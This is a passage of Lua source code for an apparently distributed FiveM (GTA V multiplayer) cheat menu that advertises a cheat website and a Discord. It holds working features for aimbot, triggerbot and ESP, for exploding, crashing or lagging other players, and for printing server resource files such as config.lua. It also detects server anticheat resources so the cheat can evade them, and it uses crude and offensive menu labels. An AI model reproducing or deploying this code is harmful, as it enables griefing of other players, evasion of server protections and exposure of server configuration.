'162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255' }, ['Current'] = 256, ['cb'] = c0 }, { ['Text'] = 'Delay (ms)', ['Type'] = 'list', ['Items'] = { '25', '50', '75', '100', '125', '150', '175', '200', '225', '250', '275', '300', '325', '350', '375', ' 400', '425', '450', '475', '500' }, ['Current'] = 5, ['cb'] = c0 }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, {}, { { ['Text'] = '[~r~MENU DEV~s~] Jocke#8222', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = '[~r~DEV / IDEAS~s~] clap#5153', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = '[~r~DEV / IDEAS~s~] Rick#7541', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = '[~r~WEBSITE~s~] wavecheats.cc', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = '[~r~discord.gg/NVUCZSv~s~] ~s~eynice', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Interactsound menu →', ['Type'] = 'menu', ['Menu'] = 23 }, { ['Text'] = 'Rape all players', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Explode everyone', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Give server cancer', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Explode everyone (silent)', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Prop everyone', ['Type'] = 'list', ['Items'] = { 'ferris wheel', 'container', 'ufo', 'gas tank', 'helicopter' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Remove spawned props', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Weapon customization →', ['Type'] = 'menu', ['Menu'] = 19 }, { ['Text'] = 'Ammo customization →', ['Type'] = 'menu', ['Menu'] = 25 }, { ['Text'] = 'Explosive hands', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Åïmßð†', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Åïmßð† [fov]', ['Type'] = 'list', ['Items'] = { '0.05', '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9', '0.95', '1.0' }, ['Current'] = 5, ['cb'] = bC }, { ['Text'] = 'Åïmßð† [bone]', ['Type'] = 'list', ['Items'] = { 'body', 'head', 'pelvis', 'right calf', 'left calf', 'right foot', 'left foot', 'closest' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Show åïmßð† fov', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = '†rïggêrßð†', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = '§þïñßð†', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Crosshair', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Give all weapons', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Remove all weapons', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Give weapon', ['Type'] = 'list', ['Items'] = a1, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Include self', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Distance', ['Type'] = 'list', ['Items'] = { 'infinite', '25.0', '50.0', '75.0', '100.0', '150.0', '200.0', '300.0', '400.0', '500.0', '750.0', '1000.0', '1250.0', '1500.0', '1750.0', '2000.0' }, ['Current'] = 1, ['cb'] = function(aM)
    d['ESP Distance'] = aM['Items'][aM['Current']]
end }, { ['Text'] = 'Player boxes', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Player lines', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Player names', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Player blips', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = ch }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, {}, { { ['Text'] = 'Spectate', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Teleport', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Explode', ['Type'] = 'list', ['Items'] = { 'silent', 'loud' }, ['Current'] = 1, ['cb'] = c1 }, { ['Text'] = 'Give health', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Play sound on player', ['Type'] = 'list', ['Items'] = r, ['Current'] = 1, ['cb'] = cq }, { ['Text'] = 'Give armour', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Crash / lag', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Cage', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Allahu akbar', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Drive-by [ped]', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Slap', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Airstrike', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Kick from vehicle', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Give all weapons', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Give weapon', ['Type'] = 'list', ['Items'] = a1, ['Current'] = 1, ['cb'] = c1 }, { ['Text'] = 'Set as friend', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = '[UNSAFE] Revive', ['Type'] = 'button', ['cb'] = c1 }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 9 } }, { { ['Text'] = 'Attempt to load ESX', ['Type'] = 'button', ['cb'] = bq }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Vehicle spawner →', ['Type'] = 'menu', ['Menu'] = 17 }, { ['Text'] = 'Drive to waypoint →', ['Type'] = 'menu', ['Menu'] = 13 }, { ['Text'] = 'Los Santos Customs →', ['Type'] = 'menu', ['Menu'] = 14 }, { ['Text'] = 'Speedometer', ['Type'] = 'list', ['Items'] = { 'off', 'km/h', 'mph' }, ['Current'] = 1, ['cb'] = cd }, { ['Text'] = 'Max fuel', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Insta brake [SPACE + S]', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Repair car', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Stealth repair', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Flip vehicle', ['Type'] = 'button', ['cb'] = function()
    local bH = GetVehiclePedIsUsing(PlayerPedId())
    if bH then
        SetEntityCoords(bH, GetEntityCoords(bH) + vec3(0.0, 0.0, 2.0))
        Wait(50)
        SetVehicleOnGroundProperly(bH)
    end
end }, { ['Text'] = 'Wash car', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Delete car', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Unlock closest car', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Drive to waypoint', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Speed (km/h)', ['Type'] = 'list', ['Items'] = { '10', '20', '30', '40', '50', '60', '70', '80', '90', '100', '110', ' 120', '130', '140', '150', '180', '200', '220' }, ['Current'] = 5, ['cb'] = cd }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 12 } }, { { ['Text'] = 'Vehicle cosmetics →', ['Type'] = 'menu', ['Menu'] = 15 }, { ['Text'] = 'Vehicle performance →', ['Type'] = 'menu', ['Menu'] = 16 }, { ['Text'] = 'Set vehicle plate text', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 12 } }, { { ['Text'] = 'Neon lights', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = cd }, { ['Text'] = 'Neon RGB', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = cd }, { ['Text'] = 'Paintjob RGB', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = cd }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 14 } }, { { ['Text'] = 'Boost vehicle', ['Type'] = 'list', ['Items'] = { '0.0', '20.0', '40.0', '60.0', '80.0', '100.0', '120.0', '140.0', '160.0', '180.0', '200.0' }, ['Current'] = 1, ['cb'] = cd }, { ['Text'] = 'Vehicle nitro [L CTRL]', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = cd }, { ['Text'] = 'Super handling', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 14 } }, { { ['Text'] = 'Enter car when spawning', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Spawn car [custom input]', ['Type'] = 'button', ['cb'] = cd }, { ['Text'] = 'Spawn custom car', ['Type'] = 'list', ['Items'] = { 'Robot' }, ['Current'] = 1, ['cb'] = aT } }, { { ['Text'] = 'Lock time', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = ci }, { ['Text'] = 'Set hour of day', ['Type'] = 'list', ['Items'] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23' }, ['Current'] = 9, ['cb'] = ci }, { ['Text'] = 'Set weather', ['Type'] = 'list', ['Items'] = { 'NONE', 'EXTRASUNNY', 'CLEAR', 'NEUTRAL', 'SMOG', 'FOGGY', 'OVERCAST', 'CLOUDS', 'CLEARING', 'RAIN', 'THUNDER', 'SNOW', 'BLIZZARD', 'SNOWLIGHT', 'XMAS', 'HALLOWEEN' }, ['Current'] = 1, ['cb'] = ci }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Special finish', ['Type'] = 'list', ['Items'] = { 'add', 'remove' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Suppressor', ['Type'] = 'list', ['Items'] = { 'add', 'remove' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Scope', ['Type'] = 'list', ['Items'] = { 'add', 'remove' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Flashlight', ['Type'] = 'list', ['Items'] = { 'add', 'remove' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Grip', ['Type'] = 'list', ['Items'] = { 'add', 'remove' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Tint', ['Type'] = 'list', ['Items'] = { 'normal', 'green', 'gold', 'pink', 'army', 'lspd', 'orange', 'platinum' }, ['Current'] = 1, ['cb'] = cl }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 7 } }, {}, { { ['Text'] = 'Teleport to waypoint', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Teleport to coords', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 2 } }, { { ['Text'] = 'Festive', ['Type'] = 'list', ['Items'] = { 'Smoke', 'Musician', 'Dj', 'Coffee', 'Beer', 'Air Guitar', 'Air Shagging', 'Rock\'n\'roll', 'Drunk Standing', 'Vomiting' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Greetings', ['Type'] = 'list', ['Items'] = { 'Hello', 'Wave', 'Handshake', 'Hugging', 'Salute' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Job', ['Type'] = 'list', ['Items'] = { 'Suspect : Surrender', 'Fishing', 'Police : Investigate', 'Police : Use Radio', 'Police : Traffic', 'Police : Binoculars', 'Agriculture : Planting', 'Mechanic : Fixing Motor', 'Medic : Kneel', 'Taxi : Talk to customer', 'Taxi : Give bill', 'Grocer : Give', 'Barman : Serve Shot', 'Journalist : Take Photos', 'All Jobs : Clipboard', 'All Jobs : Hammering', 'Bum : Holding Sign', 'Bum : Human Statue' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Fun', ['Type'] = 'list', ['Items'] = { 'Cheering', 'Super', 'Point', 'Come here', 'Bring it on', 'Me', 'I knew it', 'Exhausted', 'I\'m the shit', 'Facepalm', 'Calm down ', 'What did I do?', 'Fear', 'Fight ?', 'It\'s not possible !', 'Embrace', 'Finger of honor', 'You wanker', 'Bullet in the head' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Sports', ['Type'] = 'list', ['Items'] = { 'Flex muscles', 'Lift weights', 'Do push ups', 'Do sit ups', 'Do yoga' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Divers', ['Type'] = 'list', ['Items'] = { 'Drink coffee', 'Sit', 'Lean against wall', 'Sunbathe Back', 'Sunbathe Front', 'Clean', 'BBQ', 'Search', 'Take selfie', 'Listen to wall/door' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Walking Styles', ['Type'] = 'list', ['Items'] = { 'Normal M', 'Normal F', 'Depressed male', 'Depressed female', 'Business', 'Determined', 'Casual', 'Ate too much', 'Hipster', 'Injured', 'In a hurry', 'Hobo', 'sad', 'Muscle', 'Shocked', 'Being shady', 'Buzzed', 'Hurry', 'Proud', 'Short race', 'Man eater', 'Sassy', 'Arrogant' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'NSFW', ['Type'] = 'list', ['Items'] = { 'Man receiving in car', 'Woman giving in car', 'Man on bottom in car', 'Woman on top in car', 'Scratch nuts', 'Hooker 1', 'Hooker 2', 'Hooker 3', 'Strip Tease 1', 'Strip Tease 2', 'Stip Tease On Knees' }, ['Current'] = 1, ['cb'] = cm }, { ['Text'] = 'Cancel animation', ['Type'] = 'button', ['cb'] = cm }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 2 } }, { { ['Text'] = 'Interactsound spammer', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Interactsound blocker', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Play on all', ['Type'] = 'list', ['Items'] = r, ['Current'] = 1, ['cb'] = cq }, { ['Text'] = 'Cancel sound (self)', ['Type'] = 'button', ['cb'] = cq }, { ['Text'] = 'Cancel sound (all)', ['Type'] = 'button', ['cb'] = cq }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 6 } }, { { ['Text'] = 'Prop outline', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Ped outline', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Vehicle outline', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Debug print', ['Type'] = 'toggle', ['Enabled'] = W, ['cb'] = function()
    W = not W
end }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Infinite ammo', ['Type'] = 'list', ['Items'] = { 'off', 'safe', 'infinite ammo' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Teleport to bullet', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Firework ammo', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Explosive ammo', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 7 } }, { { ['Text'] = 'Freecam', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = cx }, { ['Text'] = 'Object preview', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Freecam speed', ['Type'] = 'list', ['Items'] = { '0.5', '1.0', '1.5', '2.0', '3.5', '4.0', '4.5', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '12.5', '15.0', '17.5', '20.0', '25.0', '30.0', '35.0', '40.0', '50.0', '60.0', '70.0', '80.0', '90.0', '100.0' }, ['Current'] = 2, ['cb'] = cx }, { ['Text'] = 'Freecam object', ['Type'] = 'list', ['Items'] = E, ['Current'] = 1, ['cb'] = cx }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 2 } } }
CreateThread(function()
    local Z, cI, cJ = {}, {}, {}
    CreateThread(function()
        while true do
            if d['Prop outline'] or d['Ped outline'] or d['Vehicle outline'] then
                Z = aL('Object')
                cI = aL('Ped')
                cJ = aL('Vehicle')
            end
            Wait(1500)
        end
    end)
    local ab = { 255, 255, 255, 255 }
    while true do
        Wait(0)
        if d['Prop outline'] then
            for F, G in pairs(Z) do
                aa(G, ab)
            end
        end
        if d['Ped outline'] then
            for F, G in pairs(cI) do
                aa(G, ab)
            end
        end
        if d['Vehicle outline'] then
            for F, G in pairs(cJ) do
                aa(G, ab)
            end
        end
    end
end)
local cK = function()
    local cL, cM = 1, 1
    local bn = GetGameTimer()
    local cN = 1
    while not C do
        Wait(0)
        if IsDisabledControlJustReleased(0, 121) and not visible then
            z = true
            if d['Menu sounds'] then
                PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end
        if z then
            if IsDisabledControlJustReleased(0, 194) then
                cL = 1
                if b_[cN][3] then
                    cN = b_[cN][3]
                else
                    z = false
                end
                if d['Menu sounds'] then
                    PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end
            end
            DrawRect(e, f - 0.275, 0.197, 0.05, table.unpack(by['Label']))
            ar(b_[cN][1], f - 0.29, true, nil, 0.45, e, true, 0.1)
            ar(tostring(cL) .. '/' .. tostring(#Z[cN]), f + 0.233, false, nil, 0.25, e, true, 0.1)
            ar('clap', f + 0.233, true, nil, 0.23, e - 0.082, true, 0.1)
            ar('rick', f + 0.233, true, nil, 0.23, e + 0.082, true, 0.1)
            ar('Made by Jocke#8222', f - 0.253, true, nil, 0.23, e, true, 0.1)
            DrawRect(e, f, 0.197, 0.5, table.unpack(by['Background']))
            DrawRect(e, f, 0.18, 0.47, table.unpack(am(0.1, true)))
            DrawRect(e, f, 0.17, 0.455, table.unpack(by['Main']))
            local cO = 0.095
            local cP = {}
            local cQ = 1
            for F, G in pairs(Z[cN]) do
                if F == cL then
                    cM = cQ
                end
                if #Z[cN] <= 12 then
                    table.insert(cP, G)
                    cQ = cQ + 1
                else
                    if cL <= 12 then
                        if F <= 12 then
                            table.insert(cP, G)
                            cQ = cQ + 1
                        end
                    else
                        if F > #Z[cN] - (#Z[cN] - cL) - 12 then
                            if F < #Z[cN] - (#Z[cN] - cL) + 1 then
                                table.insert(cP, G)
                                cQ = cQ + 1
                            end
                        end
                    end
                end
            end
            local cR = {}
            for F, G in pairs(cP) do
                table.insert(cR, G)
            end
            for F, G in pairs(cR) do
                local cS = f - 0.32
                if G['Type'] == 'button' or G['Type'] == 'menu' then
                    if F == cM then
                        ar(G['Text'], cS + cO, false, { 255, 255, 255 })
                    else
                        ar(G['Text'], cS + cO, false)
                    end
                elseif G['Type'] == 'list' then
                    local as = ('%s ← ~b~%s ~s~→'):format(G['Text'], G['Items'][G['Current']]:lower())
                    if F == cM then
                        ar(as, cS + cO, false, { 255, 255, 255 })
                    else
                        ar(as, cS + cO, false)
                    end
                elseif G['Type'] == 'toggle' then
                    if F ~= cM then
                        if G['Enabled'] then
                            ar(G['Text'], cS + cO, false, { 0, 255, 119 })
                        else
                            ar(G['Text'], cS + cO, false, { 255, 0, 76 })
                        end
                    else
                        if G['Enabled'] then
                            ar(G['Text'] .. ' ~g~[ON]', cS + cO, false, { 255, 255, 255 })
                        else
                            ar(G['Text'] .. ' ~r~[OFF]', cS + cO, false, { 255, 255, 255 })
                        end
                    end
                end
                cO = cO + 0.039
            end
            if bn < GetGameTimer() then
                if IsDisabledControlPressed(0, 173) then
                    if Z[cN][cL + 1] then
                        cL = cL + 1
                    else
                        cL = 1
                    end
                    bn = GetGameTimer() + b
                    if d['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 172) then
                    if Z[cN][cL - 1] then
                        cL = cL - 1
                    else
                        cL = #Z[cN]
                    end
                    bn = GetGameTimer() + b
                    if d['Menu sounds'] then
                        PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                elseif IsDisabledControlPressed(0, 191) then
                    if d['Menu sounds'] then
                        PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    end
                    local G = Z[cN][cL]
                    if G['Type'] == 'toggle' then
                        G['Enabled'] = not G['Enabled']
                        G['cb'](G)
                    elseif G['Type'] == 'button' then
                        G['cb'](G)
                    elseif G['Type'] == 'list' then
                        G['cb'](G)
                    elseif G['Type'] == 'menu' then
                        cL = 1
                        if string.find(G['Text'], "Server resources") then
                            Z[G['Menu']] = {}
                            for Q = 0, GetNumResources() - 1 do
                                if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                                    table.insert(Z[G['Menu']], { ['Text'] = GetResourceByFindIndex(Q) .. ' →', ['Type'] = 'menu', ['Menu'] = 20, ['Other'] = GetResourceByFindIndex(Q) })
                                end
                            end
                            table.insert(Z[G['Menu']], { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 3 })
                        end
                        if G['Menu'] == 20 then
                            Z[G['Menu']] = {}
                            local as = LoadResourceFile(G['Other'], 'config.lua')
                            local cT = function()
                                X(as)
                            end
                            local cU = function()
                                local cV = ah('What file to print? Don\'t forget extension (e.g. .lua)', '', 30)
                                if cV then
                                    local cW = LoadResourceFile(G['Other'], cV)
                                    if cW then
                                        X(cW)
                                    else
                                        X('File not found')
                                    end
                                end
                            end
                            if as then
                                table.insert(Z[G['Menu']], { ['Text'] = 'Print config.lua file [F8]', ['Type'] = 'button', ['cb'] = cT })
                            end
                            table.insert(Z[G['Menu']], { ['Text'] = 'Print custom file [F8]', ['Type'] = 'button', ['cb'] = cU })
                            table.insert(Z[G['Menu']], { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 4 })
                        end
                        if string.find(G['Text'], "Player menu") then
                            Z[G['Menu']] = {}
                            local cX = G['Menu']
                            for F, G in pairs(GetActivePlayers()) do
                                table.insert(Z[cX], { ['Text'] = GetPlayerName(G) .. ' (' .. GetPlayerServerId(G) .. ')', ['Type'] = 'menu', ['Menu'] = 10 })
                            end
                            table.insert(Z[G['Menu']], { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 })
                        end
                        for a8, a9 in pairs(GetActivePlayers()) do
                            if string.find(G['Text'], '(' .. GetPlayerServerId(a9) .. ')', 1, true) then
                                b_[10][1] = GetPlayerName(a9) .. ' (' .. GetPlayerServerId(a9) .. ')'
                                for F, G in pairs(Z[10]) do
                                    if string.find(G['Text']:lower(), 'friend', 1, true) then
                                        if i[GetPlayerServerId(a9)] then
                                            G['Text'] = 'Remove friend'
                                        else
                                            G['Text'] = 'Set as friend'
                                        end
                                    end
                                    if string.find(G['Text']:lower(), 'spectat') then
                                        if j then
                                            if k == GetPlayerServerId(a9) then
                                                G['Text'] = 'Stop spectating'
                                            else
                                                G['Text'] = 'Spectate'
                                            end
                                        else
                                            G['Text'] = 'Spectate'
                                        end
                                    end
                                end
                                h = GetPlayerServerId(a9)
                            end
                        end
                        cN = G['Menu']
                    end
                    bn = GetGameTimer() + b
                elseif IsDisabledControlPressed(0, 174) then
                    local G = Z[cN][cL]
                    if G['Type'] == 'list' then
                        if G['Items'][G['Current'] - 1] then
                            G['Current'] = G['Current'] - 1
                        else
                            G['Current'] = #G['Items']
                        end
                        if d['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        bn = GetGameTimer() + b
                    end
                elseif IsDisabledControlPressed(0, 175) then
                    local G = Z[cN][cL]
                    if G['Type'] == 'list' then
                        if G['Items'][G['Current'] + 1] then
                            G['Current'] = G['Current'] + 1
                        else
                            G['Current'] = 1
                        end
                        if d['Menu sounds'] then
                            PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                        end
                        bn = GetGameTimer() + b
                    end
                end
            end
        end
    end
end
local cY = function()
    for F, G in pairs(Y) do
        for Q = 0, GetNumResources() - 1 do
            if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
                local as = LoadResourceFile(GetResourceByFindIndex(Q), G[1])
                if as then
                    if as.find(as:lower(), G[2]:lower()) then
                        print('Anticheat warning! ^1' .. GetResourceByFindIndex(Q))
                        t = true
                        local T = GetGameTimer() + 4500
                        while T >= GetGameTimer() do
                            Wait(0)
                            ar(('This server is probably using an anticheat (resource: %s).\nSome functions have been disabled for your safety.'):format(GetResourceByFindIndex(Q)), 0.3, false, { 255, 0, 0 }, 0.5, 0.5, true, 0.1)
                        end
                        return
                    end
                end
            end
        end
    end
end
local cZ = function()
    while true do
        o = {}
        for F, G in pairs(GetActivePlayers()) do
            if not i[GetPlayerServerId(G)] then
                table.insert(o, G)
            end
        end
        Wait(1000)
    end
end
p = { ['cycles'] = { 'BMX', 'CRUISER', 'FIXTER', 'SCORCHER', 'TRIBIKE', 'TRIBIKE2', 'TRIBIKE3' }, ['sports'] = { 'ALPHA', 'BANSHEE', 'BESTIAGTS', 'BLISTA2', 'BLISTA3', 'BUFFALO', 'BUFFALO2', 'BUFFALO3', 'CARBONIZZARE', 'COMET2', 'COMET3', 'COMET4', 'COMET5', 'COQUETTE', 'ELEGY', 'ELEGY2', 'FELTZER2', 'FLASHGT', 'FUROREGT', 'FUSILADE', 'FUTO', 'GB200', 'HOTRING', 'ITALIGTO', 'JESTER', 'JESTER2', 'KHAMELION', 'KURUMA', 'KURUMA2', 'LYNX', 'MASSACRO', 'MASSACRO2', 'NEON', 'NINEF', 'NINEF2', 'OMNIS', 'PARIAH', 'PENUMBRA', 'RAIDEN', 'RAPIDGT', 'RAPIDGT2', 'RAPTOR', 'REVOLTER', 'RUSTON', 'SCHAFTER2', 'SCHAFTER3', 'SCHAFTER4', 'SCHAFTER5', 'SCHLAGEN', 'SCHWARZER', 'SENTINEL3', 'SEVEN70', 'SPECTER', 'SPECTER2', 'SULTAN', 'SURANO', 'TAMPA2', 'TROPOS', 'VERLIERER2', 'ZR380', 'ZR3802', 'ZR3803' }, ['compacts'] = { 'BLISTA', 'BRIOSO', 'DILETTANTE', 'ISSI2', 'ISSI3', 'ISSI4', 'ISSI5', 'ISSI6', 'PANTO', 'PRAIRIE', 'RHAPSODY' }, ['offroad'] = { 'BFINJECTION', 'BIFTA', 'BLAZER', 'BLAZER2', 'BLAZER3', 'BLAZER4', 'BLAZER5', 'BODHI2', 'BRAWLER', 'BRUISER', 'BRUISER2', 'BRUISER3', 'BRUTUS', 'BRUTUS2', 'BRUTUS3', 'CARACARA', 'DLOADER', 'DUBSTA3', 'DUNE', 'DUNE2', 'DUNE3', 'DUNE4', 'DUNE5', 'FREECRAWLER', 'INSURGENT', 'INSURGENT2', 'INSURGENT3', 'KALAHARI', 'KAMACHO', 'MARSHALL', 'MENACER', 'MESA3', 'MONSTER', 'MONSTER3', 'MONSTER4', 'MONSTER5', 'NIGHTSHARK', 'RANCHERXL', 'RANCHERXL2', 'RCBANDITO', 'REBEL', 'REBEL2', 'RIATA', 'SANDKING', 'SANDKING2', 'TECHNICAL', 'TECHNICAL2', 'TECHNICAL3', 'TROPHYTRUCK', 'TROPHYTRUCK2' }, ['sportsclassics'] = { 'ARDENT', 'BTYPE', 'BTYPE2', 'BTYPE3', 'CASCO', 'CHEBUREK', 'CHEETAH2', 'COQUETTE2', 'DELUXO', 'FAGALOA', 'FELTZER3', 'GT500', 'INFERNUS2', 'JB700', 'JESTER3', 'MAMBA', 'MANANA', 'MICHELLI', 'MONROE', 'PEYOTE', 'PIGALLE', 'RAPIDGT3', 'RETINUE', 'SAVESTRA', 'STINGER', 'STINGERGT', 'STROMBERG', 'SWINGER', 'TORERO', 'TORNADO', 'TORNADO2', 'TORNADO3', 'TORNADO4', 'TORNADO5', 'TORNADO6', 'TURISMO2', 'VISERIS', 'Z190', 'ZTYPE' }, ['motorcycles'] = { 'AKUMA', 'AVARUS', 'BAGGER', 'BATI', 'BATI2', 'BF400', 'CARBONRS', 'CHIMERA', 'CLIFFHANGER', 'DAEMON', 'DAEMON2', 'DEFILER', 'DEATHBIKE', 'DEATHBIKE2', 'DEATHBIKE3', 'DIABLOUS', 'DIABLOUS2', 'DOUBLE', 'ENDURO', 